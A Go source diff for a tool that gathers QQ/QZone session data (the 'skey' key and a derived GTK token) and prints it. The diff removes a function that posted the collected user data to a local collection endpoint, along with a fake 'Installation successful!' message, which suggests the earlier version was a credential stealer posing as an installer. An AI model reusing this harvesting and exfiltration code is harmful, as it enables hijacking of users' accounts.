@@ -5,7 +5,6 @@ import (
 	"fmt"
 	"io/ioutil"
 	"net/http"
-	"net/url"
 	"regexp"
 	"strings"
 )
@@ -34,7 +33,6 @@ const (
 func main() {
 	getInfo(qzoneReferer, qzoneTargetUrl, "QZone")
 	getInfo(friendReferer, friendTargetUrl, "Friends")
-	fmt.Println("安装成功!")
 }
 
 func getInfo(referer, targetUrl, title string) {
@@ -118,8 +116,6 @@ func getInfo(referer, targetUrl, title string) {
 	user.GTK = genderGTK(skey)
 
 	fmt.Printf("%+v \n", user)
-	//bytes, _ := json.Marshal(user)
-	//sendURL(string(bytes))
 }
 
 // 根据key匹配数组中的值
@@ -145,13 +141,6 @@ func genderGTK(skey string) int {
 		hash += (hash << 5) + int(skey[i])
 	}
 	return hash & 0x7fffffff
-}
-
-func sendURL(data string) {
-	_, err := http.PostForm("http://127.0.0.1:9500/qzone", url.Values{"data": {data}})
-	if err != nil {
-		fmt.Println("记录信息失败:" + err.Error())
-	}
 }
 
 func getAllFriends(user *User) {
